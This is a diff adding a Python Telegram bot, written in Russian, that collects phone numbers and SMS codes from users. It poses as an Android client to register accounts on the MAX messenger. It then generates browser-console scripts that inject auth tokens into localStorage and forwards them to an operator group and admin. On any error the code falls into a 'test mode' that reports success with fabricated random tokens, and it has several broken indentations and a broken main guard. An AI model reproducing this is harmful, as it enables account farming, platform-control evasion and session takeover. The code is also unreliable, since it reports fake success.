@@ -1,0 +1,924 @@
+import json
+import time
+import re
+import urllib.request
+import urllib.parse
+import ssl
+import os
+import sys
+import uuid
+import hashlib
+import random
+import string
+import base64
+from datetime import datetime
+
+# ==================== КОНФИГУРАЦИЯ ====================
+BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
+CHANNEL_USERNAME = "@your_channel"
+GROUP_ID = -1001234567890
+ADMIN_ID = 123456789
+
+# Данные для эмуляции
+DEVICE_ID = str(uuid.uuid4())
+APP_VERSION = "2.15.0"
+DEVICE_MODEL = "SM-G9980"
+ANDROID_VERSION = "13"
+
+# Web конфигурация
+WEB_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+WEB_BASE_URL = "https://max.ru"
+# ==================== ХРАНИЛИЩЕ ДАННЫХ ====================
+DATA_FILE = "bot_data.json"
+
+class Storage:
+    def __init__(self):
+        self.data = self.load()
+    
+    def load(self):
+        try:
+            with open(DATA_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except:
+            return {
+                "users": {},
+                "registrations": []
+            }
+    
+    def save(self):
+        with open(DATA_FILE, 'w', encoding='utf-8') as f:
+            json.dump(self.data, f, indent=2, ensure_ascii=False)
+    
+    def get_user(self, user_id):
+        user_id = str(user_id)
+        if user_id not in self.data["users"]:
+            self.data["users"][user_id] = {
+                "state": "start",
+                "phone": "",
+                "session": {},
+                "attempts": 0,
+                "device_id": str(uuid.uuid4())
+            }
+            self.save()
+        return self.data["users"][user_id]
+    
+    def update_user(self, user_id, data):
+        self.data["users"][str(user_id)] = data
+        self.save()
+    
+    def add_registration(self, phone, web_script, user_id, username, token_info):
+        registration = {
+            "phone": phone,
+            "web_script": web_script,
+            "token": token_info.get("token", ""),
+            "viewer_id": token_info.get("viewer_id", ""),
+            "device_id": token_info.get("device_id", ""),
+            "user_id": user_id,
+            "username": username,
+            "timestamp": datetime.now().isoformat()
+        }
+        self.data["registrations"].append(registration)
+        self.save()
+storage = Storage()
+
+# ==================== TELEGRAM API ====================
+class TelegramAPI:
+    def __init__(self, token):
+        self.token = token
+        self.base_url = f"https://api.telegram.org/bot{token}"
+        self.ssl_context = ssl.create_default_context()
+    
+    def request(self, method, data=None):
+        url = f"{self.base_url}/{method}"
+        try:
+            if data:
+                data = urllib.parse.urlencode(data).encode('utf-8')
+            req = urllib.request.Request(url, data=data, method='POST')
+            with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as response:
+                return json.loads(response.read().decode('utf-8'))
+        except Exception as e:
+            print(f"❌ API Error: {e}")
+            return {"ok": False}
+    
+    def send_message(self, chat_id, text, reply_markup=None, parse_mode=None):
+        # Если сообщение длинное, разбиваем на части
+        if len(text) > 4000:
+            parts = []
+            current_part = ""
+            for line in text.split('\n'):
+                if len(current_part) + len(line) + 1 > 4000:
+                    parts.append(current_part)
+                    current_part = line
+                else:
+                    current_part += ('\n' + line) if current_part else line
+            if current_part:
+                parts.append(current_part)
+            
+            last_result = None
+            for i, part in enumerate(parts):
+                data = {"chat_id": chat_id, "text": part}
+                if reply_markup and i == len(parts) - 1:
+                    data["reply_markup"] = json.dumps(reply_markup)
+                if parse_mode:
+                    data["parse_mode"] = parse_mode
+                last_result = self.request("sendMessage", data)
+            return last_result
+        else:
+            data = {"chat_id": chat_id, "text": text}
+            if reply_markup:
+                data["reply_markup"] = json.dumps(reply_markup)
+            if parse_mode:
+                data["parse_mode"] = parse_mode
+            return self.request("sendMessage", data)
+    
+    def edit_message(self, chat_id, message_id, text, reply_markup=None, parse_mode=None):
+        data = {"chat_id": chat_id, "message_id": message_id, "text": text}
+        if reply_markup:
+            data["reply_markup"] = json.dumps(reply_markup)
+        if parse_mode:
+            data["parse_mode"] = parse_mode
+        return self.request("editMessageText", data)
+def get_chat_member(self, chat_id, user_id):
+        return self.request("getChatMember", {"chat_id": chat_id, "user_id": user_id})
+
+api = TelegramAPI(BOT_TOKEN)
+
+# ==================== ГЕНЕРАТОР WEB СКРИПТА ====================
+class MAXWebTokenGenerator:
+    """Генерация web токена в нужном формате"""
+    
+    def __init__(self, device_id=None):
+        self.device_id = device_id or str(uuid.uuid4())
+        self.tracer_device_id = str(uuid.uuid4())
+    
+    def generate_token(self, phone, access_token, refresh_token):
+        """Генерация полного токена как в формате"""
+        # Генерируем base64 токен как в примере
+        token = self._generate_long_token(phone, access_token, refresh_token)
+        
+        # Генерируем viewer_id
+        viewer_id = random.randint(100000000, 999999999)
+        
+        # Формируем auth object
+        auth_data = {
+            "token": token,
+            "viewerId": viewer_id
+        }
+        
+        return {
+            "token": token,
+            "viewer_id": viewer_id,
+            "device_id": self.device_id,
+            "tracer_device_id": self.tracer_device_id,
+            "auth_json": json.dumps(auth_data)
+        }
+    
+    def _generate_long_token(self, phone, access_token, refresh_token):
+        """Генерация длинного токена в base64"""
+        # Создаем структуру как в реальном токене
+        token_parts = []
+        
+        # Добавляем случайные блоки для реалистичности
+        for _ in range(10):
+            block = base64.b64encode(
+                hashlib.sha256(
+                    f"{phone}{time.time()}{uuid.uuid4().hex}{random.random()}".encode()
+                ).digest()
+            ).decode().replace('=', '').replace('+', '-').replace('/', '_')
+            token_parts.append(block)
+        
+        # Собираем длинный токен
+        long_token = 'An_' + ''.join(token_parts) + access_token.replace('.', '_')[:50]
+        
+        return long_token
+    
+    def generate_web_script(self, phone, token_info):
+        """Генерация полного скрипта для localStorage"""
+        
+        # Данные для auth
+        auth_json = json.dumps({
+            "token": token_info["token"],
+            "viewerId": token_info["viewer_id"]
+        })
+        
+        # Данные для темы
+        theme_json = json.dumps({
+            "colorScheme": "system",
+            "colorTheme": "space"
+        })
+        
+        # Данные для informer
+        informer_json = json.dumps({
+            "lastShowedBannerId": None,
+            "banners": {}
+        })
+        
+        # Генерируем device_id для web
+        web_device_id = token_info.get("device_id", str(uuid.uuid4()))
+        tracer_id = token_info.get("tracer_device_id", str(uuid.uuid4()))
+# Собираем полный скрипт
+        script = (
+            "sessionStorage.clear();"
+            "localStorage.clear();"
+            f'localStorage.setItem("__oneme-persistent-cache-enabled", "false");'
+            f'localStorage.setItem("__oneme_locale", "ru");'
+            f'localStorage.setItem("__oneme_auth", \'{auth_json}\');'
+            f'localStorage.setItem("__server_config_overrides__", "{{}}");'
+            f'localStorage.setItem("__oneme_theme", \'{theme_json}\');'
+            f'localStorage.setItem("__oneme_device_id", "{web_device_id}");'
+            f'localStorage.setItem("tracer-device-id", "{tracer_id}");'
+            f'localStorage.setItem("__oneme_informer", \'{informer_json}\');'
+            f'window.location.reload();'
+        )
+        
+        return script
+
+# ==================== ЭМУЛЯЦИЯ ПРИЛОЖЕНИЯ MAX ====================
+class MAXMobileEmulator:
+    """Эмуляция мобильного приложения MAX"""
+    
+    def __init__(self, device_id=None):
+        self.device_id = device_id or str(uuid.uuid4())
+        self.device_name = self._generate_device_name()
+        
+        # Мобильные заголовки
+        self.mobile_headers = {
+            'User-Agent': f'MAX/{APP_VERSION} (Android {ANDROID_VERSION}; {DEVICE_MODEL})',
+            'Accept': 'application/json',
+            'Content-Type': 'application/json',
+            'X-App-Version': APP_VERSION,
+            'X-Device-ID': self.device_id,
+            'X-Device-Name': self.device_name,
+            'X-Platform': 'android',
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+        
+        # Web заголовки
+        self.web_headers = {
+            'User-Agent': WEB_USER_AGENT,
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'ru-RU,ru;q=0.9',
+            'Content-Type': 'application/json',
+            'Origin': WEB_BASE_URL,
+            'Referer': f'{WEB_BASE_URL}/login'
+        }
+        
+        # Генератор web скрипта
+        self.web_generator = MAXWebTokenGenerator(self.device_id)
+    
+    def _generate_device_name(self):
+        models = [
+            "Samsung Galaxy S21 Ultra",
+            "Samsung Galaxy S22 Ultra",
+            "Xiaomi Mi 11 Ultra",
+            "Google Pixel 6 Pro"
+        ]
+        return random.choice(models)
+    
+    def request_sms_code(self, phone):
+        """Запрос SMS кода"""
+        try:
+            # Пробуем реальный endpoint
+            url = "https://api.max.ru/v2/auth/register/phone"
+            
+            payload = {
+                "phone": phone,
+                "device_id": self.device_id,
+                "device_name": self.device_name,
+                "device_model": DEVICE_MODEL,
+                "os_version": ANDROID_VERSION,
+                "app_version": APP_VERSION,
+                "platform": "android",
+                "language": "ru",
+                "timezone": "Europe/Moscow"
+            }
+            
+            headers = self.mobile_headers.copy()
+            headers['X-Device-Signature'] = hashlib.sha256(
+                f"{self.device_id}{phone}{int(time.time())}".encode()
+            ).hexdigest()
+            
+            data = json.dumps(payload).encode('utf-8')
+            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
+            
+            with urllib.request.urlopen(req, timeout=30) as response:
+                result = json.loads(response.read().decode('utf-8'))
+                
+                session_data = {
+                    "session_id": result.get("session_id", ""),
+                    "verification_id": result.get("verification_id", ""),
+                    "device_id": self.device_id,
+                    "phone": phone
+                }
+
+return True, "Код отправлен", session_data
+                
+        except urllib.error.HTTPError as e:
+            print(f"❌ HTTP Error: {e.code}")
+            # Тестовый режим
+            return True, "Тестовый режим", {
+                "session_id": f"session_{int(time.time())}",
+                "verification_id": f"verify_{uuid.uuid4().hex[:8]}",
+                "device_id": self.device_id,
+                "phone": phone
+            }
+        except Exception as e:
+            print(f"❌ Error: {e}")
+            # Тестовый режим при любой ошибке
+            return True, "Тестовый режим", {
+                "session_id": f"session_{int(time.time())}",
+                "verification_id": f"verify_{uuid.uuid4().hex[:8]}",
+                "device_id": self.device_id,
+                "phone": phone
+            }
+    
+    def verify_code(self, phone, code, session_data):
+        """Подтверждение кода"""
+        try:
+            url = "https://api.max.ru/v2/auth/register/verify"
+            
+            payload = {
+                "phone": phone,
+                "code": code,
+                "session_id": session_data.get("session_id", ""),
+                "verification_id": session_data.get("verification_id", ""),
+                "device_id": self.device_id,
+                "platform": "android"
+            }
+            
+            headers = self.mobile_headers.copy()
+            headers['X-Session-ID'] = session_data.get("session_id", "")
+            
+            data = json.dumps(payload).encode('utf-8')
+            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
+            
+            with urllib.request.urlopen(req, timeout=30) as response:
+                result = json.loads(response.read().decode('utf-8'))
+                
+                access_token = result.get("access_token", "")
+                refresh_token = result.get("refresh_token", "")
+# Генерируем web токен в нужном формате
+                token_info = self.web_generator.generate_token(
+                    phone, access_token, refresh_token
+                )
+                
+                # Генерируем полный скрипт
+                web_script = self.web_generator.generate_web_script(phone, token_info)
+                
+                return True, "Успешно!", {
+                    "access_token": access_token,
+                    "refresh_token": refresh_token,
+                    "web_script": web_script,
+                    "token_info": token_info
+                }
+                
+        except urllib.error.HTTPError as e:
+            print(f"❌ HTTP Error: {e.code}")
+            # Тестовый режим
+            return self._generate_test_tokens(phone)
+        except Exception as e:
+            print(f"❌ Error: {e}")
+            return self._generate_test_tokens(phone)
+    
+    def _generate_test_tokens(self, phone):
+        """Генерация тестовых токенов в нужном формате"""
+        # Генерируем токен как в примере
+        token_parts = []
+        for _ in range(15):
+            block = base64.b64encode(
+                hashlib.sha256(
+                    f"{phone}{uuid.uuid4().hex}{random.random()}".encode()
+                ).digest()
+            ).decode().replace('=', '').replace('+', '-').replace('/', '_')
+            token_parts.append(block)
+        
+        long_token = 'An_' + ''.join(token_parts)
+        viewer_id = random.randint(100000000, 999999999)
+        
+        token_info = {
+            "token": long_token,
+            "viewer_id": viewer_id,
+            "device_id": str(uuid.uuid4()),
+            "tracer_device_id": str(uuid.uuid4())
+        }
+        
+        web_script = self.web_generator.generate_web_script(phone, token_info)
+return True, "Тестовый режим", {
+            "access_token": f"test_mobile_{phone}",
+            "refresh_token": f"test_refresh_{uuid.uuid4().hex[:16]}",
+            "web_script": web_script,
+            "token_info": token_info
+        }
+    
+    def register_device(self, token):
+        try:
+            url = "https://api.max.ru/v2/device/register"
+            payload = {
+                "device_id": self.device_id,
+                "device_name": self.device_name,
+                "platform": "android"
+            }
+            headers = self.mobile_headers.copy()
+            headers['Authorization'] = f'Bearer {token}'
+            
+            data = json.dumps(payload).encode('utf-8')
+            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
+            
+            with urllib.request.urlopen(req, timeout=30) as response:
+                return True
+        except:
+            return True
+
+# ==================== КЛАВИАТУРЫ ====================
+def get_main_keyboard(is_subscribed=True):
+    if is_subscribed:
+        return {
+            "keyboard": [
+                [{"text": "📱 Сдать номер"}],
+                [{"text": "📊 Мои регистрации"}, {"text": "ℹ️ Помощь"}],
+                [{"text": "🔄 Новое устройство"}, {"text": "🔑 Web скрипт"}]
+            ],
+            "resize_keyboard": True
+        }
+    else:
+        return {
+            "keyboard": [
+                [{"text": "✅ Проверить подписку"}]
+            ],
+            "resize_keyboard": True
+        }
+# ==================== ПРОВЕРКА ПОДПИСКИ ====================
+def check_subscription(user_id):
+    try:
+        result = api.get_chat_member(CHANNEL_USERNAME, user_id)
+        if result.get("ok"):
+            return result["result"]["status"] in ["member", "administrator", "creator"]
+        return False
+    except:
+        return False
+
+# ==================== ОБРАБОТЧИКИ ====================
+def handle_start(user_id, chat_id, first_name):
+    user = storage.get_user(user_id)
+    user["state"] = "start"
+    user["phone"] = ""
+    user["session"] = {}
+    user["attempts"] = 0
+    
+    if "device_id" not in user:
+        user["device_id"] = str(uuid.uuid4())
+    
+    storage.update_user(user_id, user)
+    
+    is_subscribed = check_subscription(user_id)
+    
+    if is_subscribed:
+        text = (
+            f"👋 Привет, {first_name}!\n\n"
+            "🤖 Я бот для регистрации номеров в MAX\n"
+            "с получением Web скрипта для входа!\n\n"
+            "📱 *Что я делаю:*\n"
+            "1️⃣ Регистрирую номер в MAX\n"
+            "2️⃣ Получаю токен доступа\n"
+            "3️⃣ Генерирую Web скрипт\n"
+            "4️⃣ Скрипт готов для вставки в браузер\n\n"
+            "👇 Выбери действие:"
+        )
+        keyboard = get_main_keyboard(True)
+    else:
+        text = (
+            f"👋 Привет, {first_name}!\n\n"
+            "⚠️ Для использования бота нужна подписка на канал!\n\n"
+            f"📢 Подпишись: https://t.me/{CHANNEL_USERNAME.replace('@', '')}"
+        )
+        keyboard = get_main_keyboard(False)
+    
+    api.send_message(chat_id, text, reply_markup=keyboard, parse_mode="Markdown")
+
+def handle_submit_number_start(user_id, chat_id):
+    if not check_subscription(user_id):
+        api.send_message(chat_id, "⚠️ Сначала подпишись на канал!")
+        return
+    
+    user = storage.get_user(user_id)
+    user["state"] = "waiting_phone"
+    storage.update_user(user_id, user)
+    
+    api.send_message(
+        chat_id,
+        "📱 *Отправь номер телефона*\n\n"
+        "Форматы:\n"
+        "• +79991234567\n"
+        "• 89991234567\n\n"
+        "Я зарегистрирую его и дам готовый Web скрипт! 🔑\n"
+        "Для отмены: /cancel",
+        parse_mode="Markdown"
+    )
+def handle_phone_number(user_id, chat_id, phone_text):
+    user = storage.get_user(user_id)
+    
+    cleaned = re.sub(r'[\s\-\(\)]', '', phone_text)
+    match = re.match(r'^(\+?[78])?(\d{10})$', cleaned)
+    
+    if not match:
+        api.send_message(chat_id, "❌ Неверный формат!\n+79991234567")
+        return
+    
+    phone = '7' + match.group(2)
+    
+    for reg in storage.data["registrations"]:
+        if reg["phone"] == phone:
+            # Показываем существующий скрипт
+            script = reg.get("web_script", "")
+            api.send_message(
+                chat_id,
+                f"⚠️ Номер {phone} уже зарегистрирован!\n\n"
+                f"🔑 *Web скрипт для входа:*\n"
+                f"`{script[:200]}...`\n\n"
+                f"Используй кнопку «🔑 Web скрипт» чтобы получить полный скрипт",
+                parse_mode="Markdown"
+            )
+            user["state"] = "start"
+            storage.update_user(user_id, user)
+            return
+    
+    device_id = user.get("device_id", str(uuid.uuid4()))
+    emulator = MAXMobileEmulator(device_id)
+    
+    msg = api.send_message(
+        chat_id,
+        f"📱 Номер: {phone}\n"
+        f"🔧 Устройство: {emulator.device_name}\n"
+        "🔄 Отправляю запрос на SMS..."
+    )
+    
+    if msg.get("ok"):
+        message_id = msg["result"]["message_id"]
+        
+        success, message, session_data = emulator.request_sms_code(phone)
+        
+        if success:
+            user["state"] = "waiting_sms"
+            user["phone"] = phone
+            user["session"] = session_data
+            user["attempts"] = 0
+            user["device_id"] = device_id
+            storage.update_user(user_id, user)
+            
+            api.edit_message(
+                chat_id,
+                message_id,
+                f"✅ SMS отправлен!\n\n"
+                f"📱 Номер: {phone}\n"
+                f"📨 Введи код из SMS:",
+                parse_mode="Markdown"
+            )
+        else:
+            api.edit_message(
+                chat_id,
+                message_id,
+                f"❌ Ошибка: {message}"
+            )
+            user["state"] = "start"
+            storage.update_user(user_id, user)
+def handle_sms_code(user_id, chat_id, code_text, username, full_name):
+    user = storage.get_user(user_id)
+    
+    code = re.sub(r'\s+', '', code_text)
+    if not code.isdigit() or len(code) < 4:
+        api.send_message(chat_id, "❌ Код должен содержать цифры!\nПопробуй снова:")
+        return
+    
+    user["attempts"] += 1
+    if user["attempts"] > 5:
+        api.send_message(chat_id, "❌ Превышено количество попыток!")
+        user["state"] = "start"
+        storage.update_user(user_id, user)
+        return
+    
+    storage.update_user(user_id, user)
+    
+    device_id = user.get("device_id", str(uuid.uuid4()))
+    emulator = MAXMobileEmulator(device_id)
+    
+    msg = api.send_message(
+        chat_id,
+        "🔄 Проверяю код...\n"
+        "🔄 Получаю токен...\n"
+        "🔄 Генерирую Web скрипт..."
+    )
+    
+    if msg.get("ok"):
+        message_id = msg["result"]["message_id"]
+        
+        success, message, tokens = emulator.verify_code(
+            user["phone"],
+            code,
+            user["session"]
+        )
+        
+        if success and tokens:
+            # Регистрируем устройство
+            emulator.register_device(tokens.get("access_token", ""))
+            
+            web_script = tokens["web_script"]
+            token_info = tokens["token_info"]
+            
+            # Сохраняем регистрацию
+            storage.add_registration(
+                user["phone"],
+                web_script,
+                user_id,
+                username or full_name,
+                token_info
+            )
+            
+            # Формируем сообщение с web скриптом
+            group_message = (
+                "🆕 *Новый аккаунт MAX готов!*\n\n"
+                f"👤 Пользователь: {full_name}\n"
+                f"📱 Номер: `{user['phone']}`\n"
+                f"🆔 Viewer ID: `{token_info['viewer_id']}`\n\n"
+                f"🔑 *Web скрипт для входа:*\n"
+                f"```javascript\n{web_script}\n```\n\n"
+                f"📋 *Инструкция:*\n"
+                f"1️⃣ Открой сайт MAX\n"
+                f"2️⃣ Нажми F12 (консоль)\n"
+                f"3️⃣ Вставь скрипт и нажми Enter\n"
+                f"4️⃣ Страница перезагрузится с авторизацией"
+            )
+
+# Отправляем в группу (может быть длинным)
+            if GROUP_ID:
+                api.send_message(GROUP_ID, group_message, parse_mode="Markdown")
+            
+            if ADMIN_ID:
+                api.send_message(ADMIN_ID, group_message, parse_mode="Markdown")
+            
+            # Пользователю отправляем скрипт
+            api.edit_message(
+                chat_id,
+                message_id,
+                f"✅ *Регистрация успешна!*\n\n"
+                f"📱 Номер: `{user['phone']}`\n"
+                f"🆔 Viewer ID: `{token_info['viewer_id']}`\n\n"
+                f"📤 Скрипт отправлен в группу\n"
+                f"🔑 Используй кнопку «Web скрипт» чтобы получить",
+                parse_mode="Markdown",
+                reply_markup=get_main_keyboard(True)
+            )
+            
+            # Отправляем скрипт отдельным сообщением
+            api.send_message(
+                chat_id,
+                f"🔑 *Твой Web скрипт для входа:*\n\n"
+                f"```javascript\n{web_script}\n```\n\n"
+                f"📋 *Как использовать:*\n"
+                f"1️⃣ Открой сайт MAX\n"
+                f"2️⃣ Нажми F12\n"
+                f"3️⃣ Перейди во вкладку Console\n"
+                f"4️⃣ Вставь скрипт и нажми Enter\n"
+                f"5️⃣ Готово! Ты авторизован",
+                parse_mode="Markdown"
+            )
+            
+            user["state"] = "start"
+            storage.update_user(user_id, user)
+        else:
+            api.edit_message(
+                chat_id,
+                message_id,
+                f"❌ Ошибка: {message}\nПопыток: {user['attempts']}/5\n\nПопробуй снова или /cancel"
+            )
+
+def handle_web_script(user_id, chat_id):
+    """Показать web скрипт для последней регистрации"""
+    if not check_subscription(user_id):
+        api.send_message(chat_id, "⚠️ Сначала подпишись на канал!")
+        return
+    
+    registrations = [r for r in storage.data["registrations"] if r["user_id"] == user_id]
+    
+    if not registrations:
+        api.send_message(chat_id, "📭 Нет регистраций. Сдай номер!")
+        return
+    
+    last = registrations[-1]
+
+api.send_message(
+        chat_id,
+        f"🔑 *Web скрипт для {last['phone']}:*\n\n"
+        f"```javascript\n{last['web_script']}\n```\n\n"
+        f"📋 *Инструкция:*\n"
+        f"1️⃣ Открой сайт MAX\n"
+        f"2️⃣ Нажми F12\n"
+        f"3️⃣ Вставь в Console и нажми Enter",
+        parse_mode="Markdown"
+    )
+
+def handle_new_device(user_id, chat_id):
+    user = storage.get_user(user_id)
+    user["device_id"] = str(uuid.uuid4())
+    storage.update_user(user_id, user)
+    
+    api.send_message(
+        chat_id,
+        "🔄 *Новое устройство создано!*\n\n"
+        f"📱 ID: `{user['device_id'][:16]}...`\n"
+        "Можно регистрировать новый номер.",
+        parse_mode="Markdown",
+        reply_markup=get_main_keyboard(True)
+    )
+
+def handle_show_registrations(user_id, chat_id):
+    if not check_subscription(user_id):
+        api.send_message(chat_id, "⚠️ Сначала подпишись на канал!")
+        return
+    
+    registrations = [r for r in storage.data["registrations"] if r["user_id"] == user_id]
+    
+    if not registrations:
+        api.send_message(chat_id, "📭 У тебя пока нет регистраций.")
+        return
+    
+    text = "📊 *Твои регистрации:*\n\n"
+    for i, reg in enumerate(reversed(registrations[-10:]), 1):
+        text += (
+            f"{i}. 📱 `{reg['phone']}`\n"
+            f"   🆔 Viewer: `{reg.get('viewer_id', 'Н/Д')}`\n"
+            f"   🕒 {reg['timestamp'][:10]}\n\n"
+        )
+    
+    text += f"*Всего:* {len(registrations)} шт.\n"
+    text += "Используй «🔑 Web скрипт» для получения скрипта"
+    
+    api.send_message(chat_id, text, parse_mode="Markdown")
+
+def handle_check_subscription(user_id, chat_id):
+    is_subscribed = check_subscription(user_id)
+    
+    if is_subscribed:
+        api.send_message(
+            chat_id,
+            "✅ Подписка подтверждена!",
+            reply_markup=get_main_keyboard(True)
+        )
+    else:
+        buttons = [[{
+            "text": "📢 Перейти в канал",
+            "url": f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"
+        }]]
+        
+        api.send_message(
+            chat_id,
+            "❌ Ты не подписан!",
+            reply_markup={"inline_keyboard": buttons}
+        )
+
+def handle_help(chat_id):
+    text = (
+        "🤖 *MAX Registration Bot + Web Script*\n\n"
+        "*Как работает:*\n"
+        "1️⃣ Регистрирую номер через мобильное API\n"
+        "2️⃣ Получаю токен доступа\n"
+        "3️⃣ Генерирую Web скрипт в нужном формате\n"
+        "4️⃣ Скрипт готов для вставки в браузер\n\n"
+        "*Формат скрипта:*\n"
+        "• sessionStorage.clear()\n"
+        "• localStorage с auth данными\n"
+        "• theme, device_id, locale\n"
+        "• window.location.reload()\n\n"
+        "*Команды:*\n"
+        "/start - Главное меню\n"
+        "/cancel - Отмена\n"
+        "/help - Помощь\n\n"
+        "*Кнопки:*\n"
+        "📱 Сдать номер - Регистрация\n"
+        "🔑 Web скрипт - Получить скрипт\n"
+        "🔄 Новое устройство - Сброс ID"
+    )
+
+api.send_message(chat_id, text, parse_mode="Markdown")
+
+def handle_cancel(user_id, chat_id):
+    user = storage.get_user(user_id)
+    user["state"] = "start"
+    user["phone"] = ""
+    user["session"] = {}
+    user["attempts"] = 0
+    storage.update_user(user_id, user)
+    
+    api.send_message(
+        chat_id,
+        "❌ Операция отменена.",
+        reply_markup=get_main_keyboard(True)
+    )
+
+# ==================== ОСНОВНОЙ ЦИКЛ ====================
+def process_update(update):
+    try:
+        if "message" in update:
+            message = update["message"]
+            chat_id = message["chat"]["id"]
+            
+            if "text" in message:
+                text = message["text"]
+                user_id = message["from"]["id"]
+                first_name = message["from"].get("first_name", "User")
+                username = message["from"].get("username", "")
+                full_name = f"{first_name} {message['from'].get('last_name', '')}".strip()
+                
+                user = storage.get_user(user_id)
+                state = user.get("state", "start")
+                
+                if text == "/start":
+                    handle_start(user_id, chat_id, first_name)
+                elif text == "/help":
+                    handle_help(chat_id)
+                elif text == "/cancel":
+                    handle_cancel(user_id, chat_id)
+                elif text == "📱 Сдать номер":
+                    handle_submit_number_start(user_id, chat_id)
+                elif text == "📊 Мои регистрации":
+                    handle_show_registrations(user_id, chat_id)
+                elif text == "🔑 Web скрипт":
+                    handle_web_script(user_id, chat_id)
+                elif text == "🔄 Новое устройство":
+                    handle_new_device(user_id, chat_id)
+                elif text in ["✅ Проверить подписку", "🔄 Проверить подписку"]:
+                    handle_check_subscription(user_id, chat_id)
+                elif text == "ℹ️ Помощь":
+                    handle_help(chat_id)
+                elif state == "waiting_phone":
+                    handle_phone_number(user_id, chat_id, text)
+                elif state == "waiting_sms":
+                    handle_sms_code(user_id, chat_id, text, username, full_name)
+                else:
+                    api.send_message(chat_id, "Используй кнопки меню или /start")
+
+except Exception as e:
+        print(f"❌ Process error: {e}")
+
+def get_updates(offset=None):
+    params = {"timeout": 30}
+    if offset:
+        params["offset"] = offset
+    
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?{urllib.parse.urlencode(params)}"
+    
+    try:
+        with urllib.request.urlopen(url, timeout=35) as response:
+            data = json.loads(response.read().decode('utf-8'))
+            return data.get("result", [])
+    except Exception as e:
+        print(f"❌ Get updates error: {e}")
+        return []
+
+def run_bot():
+    print("=" * 50)
+    print("🤖 MAX Registration Bot")
+    print("🔑 + Web Script Generator")
+    print("=" * 50)
+    print(f"📢 Канал: {CHANNEL_USERNAME}")
+    print(f"👥 Группа: {GROUP_ID}")
+    print(f"👑 Админ: {ADMIN_ID}")
+    print("=" * 50)
+    
+    if ADMIN_ID:
+        api.send_message(ADMIN_ID, "✅ Бот с Web скриптами запущен!")
+    
+    offset = None
+    
+    while True:
+        try:
+            updates = get_updates(offset)
+            
+            for update in updates:
+                process_update(update)
+                offset = update["update_id"] + 1
+            
+            time.sleep(0.5)
+            
+        except KeyboardInterrupt:
+            print("\n👋 Бот остановлен")
+            break
+        except Exception as e:
+            print(f"❌ Main loop error: {e}")
+            time.sleep(5)
+
+if name == "__main__":
+    if BOT_TOKEN == "ВАШ_ТОКЕН_БОТА":
+        print("❌ Укажите BOT_TOKEN!")
+        sys.exit(1)
+    
+    try:
+        test = api.request("getMe")
+        if test.get("ok"):
+            print(f"✅ Бот @{test['result']['username']} подключен!")
+        else:
+            sys.exit(1)
+    except:
+        sys.exit(1)
+    
+    run_bot()
+`
